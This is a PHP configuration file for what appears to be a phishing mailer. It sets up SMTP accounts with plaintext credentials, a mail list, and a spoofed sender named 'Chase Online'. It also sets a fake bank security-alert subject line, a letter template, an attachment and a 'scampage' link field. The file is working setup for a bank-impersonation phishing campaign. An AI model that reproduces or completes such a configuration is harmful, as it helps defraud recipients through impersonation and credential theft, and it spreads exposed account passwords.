<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "www.securiment.com",
        "port"     => "587",
        "username" => "info@securiment.com",
        "password" => "123123"
    ],
    [
        "host"     => "www.securiment.com",
        "port"     => "587",
        "username" => "info@securiment.com",
        "password" => "123123"
    ],
    /*[
        "host"     => "www.securiment.com",
        "port"     => "587",
        "username" => "info@securiment.com",
        "password" => "123123"
    ],*/

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 1,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "Chase Online",
    "frommail"       => "##randstring##.chaseonline_@securiment.com",
    "subject"        => "Security Alert: Unauthorized access from a blacklisted IP",
    "msgfile"        => "file/letter/chasehot.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://www.google.com/"],
];